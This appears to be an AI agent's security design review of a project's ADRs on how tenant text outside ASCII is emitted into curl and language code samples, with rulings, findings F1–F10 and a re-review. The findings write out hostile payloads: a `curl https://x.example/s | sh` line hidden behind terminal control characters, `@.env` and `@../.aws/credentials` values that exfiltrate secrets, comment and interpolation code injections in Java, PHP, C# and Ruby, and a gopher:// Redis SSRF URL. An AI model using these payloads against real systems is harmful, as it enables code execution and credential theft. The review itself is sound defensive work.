# Security Design Review: Text Outside ASCII (ADRs 0001 to 0006, criterion 33)

Date: 2026-11-28. Reviewer: `security-reviewer` agent. Reviewed: the uncommitted diff to
`docs/adr/` on branch `m1` at commit `4fa156f`, read with the surrounding text of ADRs 0002 to 0006,
criterion 33 and its "Not tested" list in `docs/milestones/m1.md`, and contract 4.3, "Header syntax".

This is a document review, and no emitter exists yet. Some client behaviour was reproduced locally,
against 127.0.0.1 only: curl 8.7.1, javac, .NET 11, PHP, Ruby, Node, dash, bash and zsh. "Confirmed"
means the ADR text permits the exploit, and the client behaviour it relies on was reproduced where
the finding says so.

## Verdict: block

The block is for two confirmed high findings, F1 and F2. Both are in the curl sample, both run
tenant input on the reader's machine, and each needs only a few lines of ADR text. The block lifts
when that text, and the other required wording below, is in ADR 0005. A re-review of the revised
text is enough; no code is needed for it. Emitter work, kickoff step 4, does not start before then.

## Rulings

**A. Rule 1, one percent-encoding function: accept with changes.** Encoding everything outside the
unreserved set, with upper-case hex, `%20` for a space and `allowReserved` not honoured, is stricter
than before. One literal per URL and per form body removes the double encoding of client builders.
`--globoff` is right. Four gaps: F6, F9, F10, and the literal still needing the string encoder.
Replace the bullet "The path-segment, query and form location encoders are this same function..."
with:

> "The path-segment, query and form location encoders are this same function, so a value filled in
> later is encoded exactly as a value placed at publish time. It encodes every component that comes
> from the spec or a caller: a value, a parameter or field name, and a property name that `form` or
> `deepObject` serialization makes into a name or puts inside `[ ]`. Only the delimiters the
> serialization adds are written as themselves. A string that holds an unpaired surrogate (U+D800 to
> U+DFFF not part of a pair) is refused; it is never replaced, and the encoder never throws on it.
> The path-segment encoder still refuses the values `.` and `..`. In addition, once the path is
> assembled from the template's literal text, the style prefixes and the encoded values,
> `buildRequest`, and `resolveRequest` in M2, refuse the request if any segment into which a value
> was placed is empty, or is `.` or `..` when `%2E` and `%2e` are read as `.`."

After the bullet "Each emitter writes the URL, query included, as one string literal", add:

> "That literal still goes through the emitter's string or shell encoder like any other text.
> Percent-encoding does not make it safe: the template's literal text keeps RFC 3986 sub-delims as
> written, so `'`, `$`, `(`, `)`, `!`, `*`, `&` and `;` can reach it."

**B. Rule 2, printable ASCII or refused: accept with changes.** Refusing, rather than picking an
encoding, is right. So are the cookie-octet allowlist without `'`, and re-applying the rule after
substitution, credentials included. Add to rule 2:

> "A refusal in `issues` names the parameter, scheme or part, the rule it failed and the position of
> the first character that fails, never the value. A refused credential's value appears in no issue,
> log, error report or trace."

> "Basic authentication: a `username` or `password` filled in at run time holds only U+0020 to
> U+007E, and a `username` holds no `:`; otherwise `resolveRequest` refuses the request."

> "A part's `contentType` follows the header value rule and holds no `"` or `\`. A part's
> `filename`, and a binary body's `filename`, are only the name sent in `Content-Disposition`. In
> every language, the file a sample reads from the reader's disk is named by fixed display text of
> ours, `YOUR_FILE_PATH`, and no text from the spec names a path that a sample opens."

Replace the ADR 0004 `request-invalid` condition with:

> "`buildRequest` could not place a value as the spec describes it: a header name that is not an RFC
> 9110 `token`; a header value, a cookie name or value, or a multipart part's name, filename or
> content type that ADR 0005, "Text outside ASCII", rule 2, refuses; two credentials for one header;
> or a path segment that rule 1 refuses once the path is assembled."

The mismatch with contract 4.3 is acceptable for M1, because `buildRequest` enforces the stricter
rule whatever a bundle says. It must be closed before M5 ingests anything. Replace the last bullet of
rule 2 with:

> "The guides contract's bundle check (4.3, "Header syntax") still forbids only CR, LF and NUL. It is
> aligned with this rule in the next contract draft, and M5 ingests no guide bundle until it is."

**C. Rule 3(b), bidi controls never written as themselves in a sample: accept with changes.** The
code point list and the escape table are right. I reproduced the curl `printf` construct in dash,
bash and zsh, and PHP's `\u{202E}`. But rule 3(a) relies on "the emitter's own escaping" for control
characters, and a single-quoted shell word has none (F1). The rule also allows tenant text in
comments (F3), and it names none of the per-language interpolation characters, which double-quoted
strings bring in (F5). Replace (a) with:

> "(a) every code point in General Category Cc (U+0000 to U+001F and U+007F to U+009F, which
> include U+0085, a line terminator in C#), and every character the language's escaping writes as
> an escape, listed under "String literals" below. In `curl`, which has no escape inside a
> single-quoted word, each Cc code point other than LF and HTAB is written with the `printf`
> construct of (b). LF and HTAB are written as themselves inside the quoted word, because command
> substitution drops a trailing LF. In JSON text, in every language, each Cc code point and each
> code point of (b) is written as a `\uXXXX` escape."

In (b), replace "each code point of a value" with "each code point of tenant text, a JSON key
included", and replace "in a literal or a comment" with "in a literal". Add:

> "**String literals.** Each string literal that holds tenant text is of one kind, and these
> characters are escaped in it. JavaScript: a single- or double-quoted string, never a template
> literal. Python: a string with no `f` prefix. Ruby: a double-quoted string, with `#` written `\#`.
> PHP: a double-quoted string, with `$` written `\$`. Go: an interpreted string literal. Java: a
> string literal in which `"`, `\`, CR and LF are written `\"`, `\\`, `\r` and `\n`, never as
> `\u` escapes, because Java decodes `\u0022` before it reads the string. C#: a regular string
> literal, never an interpolated or verbatim one. curl: a single-quoted word, with `'` written
> `'\''`."

> "**No tenant text in a comment.** No sample, in any language, holds tenant text in a comment. A
> comment holds only fixed text of ours. A comment has no escape: Java decodes `\u000a` in a comment
> as a line end, PHP ends a `//` comment at `?>`, C# ends one at U+0085, U+2028 and U+2029, and
> JavaScript ends one at U+2028 and U+2029."

> "**curl reads no file named by the spec.** The `curl` emitter sends an inline body with
> `--data-raw` and each multipart text value with `--form-string`. It never uses `-d`, `--data`,
> `--data-binary` or `-F` with tenant text: each reads a local file when the value starts with `@`,
> and `-F` also when it starts with `<`, and parses `;type=` in the value. `-F` and `--data-binary`
> appear only with `@YOUR_FILE_PATH`. A file part's tenant filename and content type follow as
> `;filename="…"` and `;type="…"`, which is unambiguous because rule 2 refuses `"` and `\`."

**`--form-string`: it must be written into ADR 0005, together with `--data-raw`** (the last
paragraph above). This is F2. A ruling outside the ADR binds nothing that an emitter developer reads.

**D. Twins and `llms.txt` keep bidi controls as authored: accept.** An agent reads code points in
logical order, so it is not misled by them. Character references would be half a rule, as the
architect says. Removing the controls would change tenant text and give little in return, because
the risk that matters, copied code, is closed by rule 3. The known limit is stated correctly. A
recommendation, not a requirement: a JSON response example that we serialize into a twin can write
the code points of rule 3(b) as `\u` escapes, because that does not change its parsed value.

**E. Direction of tenant text: accept with changes.** One span per control is the right design. The
control's embedding ends at its own isolated element with nothing inside it. The marker uses
`::before`, so it is not inside the override. The attribute value comes from a fixed list of ours.
Isolation does not depend on the stylesheet. Two gaps: who builds the markup, and elements that
cannot hold a span. Add after the bullet "Bidi control characters":

> "The component builds React elements from the string's code points. No tenant text is put into an
> HTML string, `dangerouslySetInnerHTML` or `innerHTML`. The rule applies inside `pre` and `code` as
> it does everywhere else. The marker is `::before` and never `::after`: content after the control
> would be inside its override and shown reversed. In an element that holds only text (`<option>`,
> `<textarea>`, `<title>`), in an attribute value, in a `<meta>` content and in text that a script
> sets (`textContent`, `document.title`), the nine controls are removed and the marks are kept."

**The architect's two points.**

- **Prose copied from a page keeps its controls: accept as designed.** The page shows a visible
  marker at each control, and our samples, the code a reader is invited to run, hold none.
- **The doctor reporting bidi controls: required before any portal is public (M4b); recommended
  in M1.** It does not protect readers from a hostile tenant. It is how a buyer whose spec source
  was tampered with finds out. Add to ADR 0004:

  > "Each string in the spec that holds a code point from U+202A to U+202E or U+2066 to U+2069 is
  > reported as an `info` finding at its `loc`, one per string. Marks are not reported. Required
  > before M4b; M1 if the product manager accepts it in scope."

**Criterion 33's fixture: yes, it should now hold bidi controls.** Add at least: U+202E in a
description, in a JSON request body example and in a tag name; U+2067 with no closing U+2069 in an
operation summary; U+200F inside a right-to-left sentence; and U+2028 in a JSON body example. Each
of these must leave `sanitizeMarkdown` and `escapeMarkdownText` unchanged. Clause (a) still holds as
written. The product manager adds a clause (g):

> "(g) no sample, in any language, and no twin's `## Example request` contains a code point of ADR
> 0005, "Text outside ASCII", rule 3(b); on each HTML page each code point from U+202A to U+202E and
> U+2066 to U+2069 is the only content of an element with `data-ez-bidi`; and no `<title>`,
> `<meta>` content or attribute value contains one."

The hostile values in F1 to F5 belong in each emitter's hostile-value tests, not in this fixture:
U+0003, ESC `[201~`, `@.env`, `<.env`, `#{`, `\u000a`, U+0085 and `?>`.

## New findings

**F1 (high, confirmed in the text). A curl sample writes C0 and C1 controls raw outside JSON.**
ADR 0005, "Text outside ASCII", rule 3(a) and the curl row of its table.

- Exploit: a `text/plain` or multipart body example holds U+0003 or ESC `[201~`, followed by
  `; curl https://x.example/s | sh` and a newline. Single quotes have no escape, so the bytes reach
  the copied command as they are. When it is pasted into a terminal, ^C discards the line being
  read, or `[201~` ends bracketed paste, and the rest runs as a command. The terminal step is from
  general knowledge and was not reproduced, and some terminals filter controls on paste. JSON bodies
  are safe for C0, because `JSON.stringify` escapes it, but not for DEL or C1.
- Fix: the replacement for (a) in ruling C.

**F2 (high, confirmed: curl behaviour reproduced). curl `-F` and `-d` read local files named by
tenant text.** ADR 0005 names no curl flag for a body or a part.

- Exploit, reproduced against a local listener: `-F "note=@<path>"` and `-F "note=<<path>"` uploaded
  the file's contents, `-d "@<path>"` sent the file as the body, and `-F 'note=hello;type=text/evil'`
  set the part's type. An example value of `@.env`, or `@../.aws/credentials`, sends a reader's
  secrets to the API host when they run the copied sample from their project directory.
  `--form-string` and `--data-raw` sent the same values literally.
- Fix: the "curl reads no file named by the spec" paragraph in ruling C.

**F3 (high, suspected). Tenant text in a sample comment becomes code.** Rule 3(b) says "in a
literal or a comment", so it expects tenant text in comments. No ADR text says that a sample has
comments.

- Exploit, each reproduced: Java, `// \u000a Runtime.getRuntime().exec(...)`, using ASCII only; PHP,
  `// x ?><?php system(...);`; C#, a summary holding U+0085 followed by a statement. Each ran the
  injected statement. Rule 3(b) escapes U+2028 but cannot escape anything in a comment, and it does
  not list U+0085.
- Fix: "No tenant text in a comment" in ruling C.

**F4 (high, suspected). A file path a sample opens may come from the spec.** `HttpRequest.body`
`binary.filename` and multipart `filename` carry a name, and the ADR does not say what path a sample
reads.

- Exploit: a binary body's filename `.env` becomes `--data-binary @.env`, or
  `open('.env', 'rb')` in Python, and uploads the file when the sample runs.
- Fix: the `filename` paragraph in ruling B.

**F5 (medium, confirmed: Ruby and Java reproduced). Rule 3(b) requires double-quoted strings,
which bring in interpolation that rule 3(a) does not name.**

- Exploit: a body string `#{system("id")}` with a U+202E beside it, which puts it in a Ruby
  double-quoted string, runs `id` when the sample runs (reproduced with `#{1+1}` and `#@x`). In
  Java, an emitter that generalizes the `‮` form to `"` closes the string (reproduced).
- Fix: "String literals" in ruling C.

**F6 (medium, confirmed: URL normalization reproduced). Dot segments are checked on the value, not
on the assembled segment.**

- Exploit, in M2: an agent calls an enabled write `POST /v1/items/{id}/archive`, where `id` has
  `style: label`, with `id` = `""`. The path is `/v1/items/./archive`, and the WHATWG URL parser
  makes it `/v1/items/archive` (reproduced in Node; `/v1/items/%2E%2E` becomes `/v1/`). A proxy that
  matches the operation before normalizing sends a different operation. Template text next to a
  variable (`/{a}.{b}`) does the same with empty values.
- Fix: the assembled-segment sentence in ruling A.

**F7 (medium, suspected). A refused credential may be echoed.** Rule 2 makes `resolveRequest`
refuse credentials, so in M2 refusals become common: a key pasted with a trailing U+200B is one.

- Exploit: an issue message that quotes the value is logged by the proxy or MCP, which writes the
  end user's key to logs, against the standing constraint.
- Fix: the "A refusal in `issues`" paragraph in ruling B.

**F8 (medium, confirmed in the text). A sample's base URL may use any scheme, and rule 1 keeps
`%XX` in a server path as written.** ADR 0005, "What an M1 sample shows", writes the first server
literally. ADR 0004's `server-not-callable` names `http://`, localhost and relative URLs, and no
other scheme.

- Exploit: a server `gopher://127.0.0.1:6379/_%0D%0ACONFIG%20SET%20dir%20...` makes the curl and PHP
  samples (both libcurl) send Redis commands to the reader's own machine. Not reproduced; no
  service was attacked.
- Fix: in ADR 0005, "Base URL": "A server URL whose scheme is not `http` or `https`, compared
  without regard to ASCII case, is treated as relative: the sample uses `base_url`." In ADR 0004,
  the first `server-not-callable` clause becomes: "Its scheme is not `https`, or it is localhost or
  relative."

**F9 (low, confirmed: reproduced in Node). Unpaired surrogates.** `JSON.parse` keeps `"\uD800"` as a
one-unit string, `encodeURIComponent` throws `URIError` on it, and `TextEncoder` writes U+FFFD.

- Exploit: operation ids `a\uD800` and `a\uD801` are distinct in the model and identical (`a` +
  U+FFFD) in every UTF-8 file, so a twin, an MCP argument or a guide's reference resolves to the
  wrong one or to neither. Alternatively, one such string aborts a build.
- Fix: in ADR 0002, "Text is kept as authored": "The parser refuses a document in which a string
  decodes to an unpaired surrogate, with a parse error that gives its location. Such text is not
  Unicode, so no rule here can keep it as authored." Also the encoder sentence in ruling A.

**F10 (low, confirmed in the text). Names produced by serialization.** "Every query name and value"
does not clearly cover an exploded object's keys or `deepObject` property names.

- Exploit, in M2: an agent passes an object value with key `x&admin=true` and adds a query
  parameter the operation does not declare.
- Fix: the "every component" sentence in ruling A.

## Notes

- **ADR 0002, "Text is kept as authored".** No normalization is the safer choice, because no stage
  can map two strings to one name. "ASCII lower-casing" must map U+0041 to U+005A only. In Node,
  `"K".toLowerCase()` is `k` and `"ſ".toUpperCase()` is `S`, so `toLowerCase` and
  `toUpperCase` are not ASCII lower-casing. Recommended: an ESLint ban on both in `engine`, beside
  the existing bans. For M4: the dashboard shows method and path beside each operation id when the
  tenant enables writes, because two ids can be confusable.
- **A non-ASCII host in a server URL.** Rule 1 covers the path only. The allowed-hosts review found
  the host formats ASCII-only, and the parsed-host check fails closed, so nothing can be sent to
  such a host. Only the sample is affected, and that is not a security matter.
- **A multipart name that contains `=`.** `--form-string 'a=b=c'` sends the name `a` (reproduced).
  That is a fidelity problem, not a security one. Refusing `=` in part names is recommended.
- **ADR 0001, "Dev tooling".** No package in the installed tree of 191 has a preinstall, install or
  postinstall script. Twelve have `prepare`, which does not run for a registry install. pnpm 10 runs
  no dependency build scripts by default. Recommended, in ADR 0001: "No dependency's lifecycle
  scripts run; adding one to `onlyBuiltDependencies` needs an ADR line", and a `packageManager`
  value with its hash. The exact pins, the committed lockfile and `--frozen-lockfile` are right. The
  MPL-2.0 point is licence policy, not security.
- **ADR 0005, "The local mock".** Failing on an unexpected `Cookie`, `Authorization` or credential
  header is a useful check that a credential is not sent where it should not be. Keep it.
- **ADR 0003, "Libraries", and ADR 0001, rule 3.** No security effect.

## Not reviewed

- Emitter code, encoder code and the renderer component, none of which exists.
- Browser behaviour of ruling E: isolation, `::before` and copy. These are from the HTML and CSS
  specifications and were not tested in a browser.
- Terminal paste handling in F1, which is from general knowledge.
- The Go, Python and JavaScript string escapers, beyond JavaScript's U+2028 in a comment
  (reproduced).
- ADR 0007, the guides contract beyond 4.3 "Header syntax", and ADR text outside the diff other
  than the sections cited.
- The licences of the dev tree, beyond reading install scripts.

## Re-review: block lifted

Same day. I re-read the uncommitted diff to ADRs 0001 to 0006, not the architect's summary of it.

**Verdict: block lifted, pass.** Every required change is in the text. In ADR 0005, rulings A to C,
F1 to F7 and F10 are in my wording. F8 is in ADR 0005, "Base URL", and in ADR 0004's first
`server-not-callable` clause. F9 is in ADR 0002, as a fatal `parse-error` for the root document.
Ruling E is in ADR 0006, "How the markup is built". The `request-invalid` row is in ADR 0004.
`text-bidi-control` is planned for M4b in ADR 0004, which meets this review's requirement, and
taking it into M1 is the product manager's call. Nothing new weakens a rule.

- **Accepted beyond the required wording:** for a non-http(s) server, "none of that URL's text
  follows it", which is stronger than required. Refusing `=` in multipart part names. The ban on
  `toLowerCase`, `toUpperCase` and the locale variants in engine source (ADR 0001, rule 4, and ADR
  0002). The lifecycle-script rule. The `packageManager` hash, which `package.json` already holds.
- **Decline accepted:** the optional `\u` escape for JSON in twins. The reason given, that a
  twin's text must equal the page file's text under criterion 33(a), is sound, and the risk it
  addressed is closed by the samples rule.
- **Note, not blocking:** ADR 0004's `parse-error` row reads "Not YAML or JSON, or empty". Add "or
  a string decodes to an unpaired surrogate (ADR 0002)", so the rule table agrees with ADR 0002.
- **Still open, outside the ADRs:** the ESLint ban is now in the uncommitted `eslint.config.js`,
  which I read but did not run; it does not catch a computed member name. Criterion 33's
  bidi fixture content and clause (g) are the product manager's to add. The emitters, encoders and
  renderer component still come to the security reviewer as code, with the hostile values listed
  under ruling C.
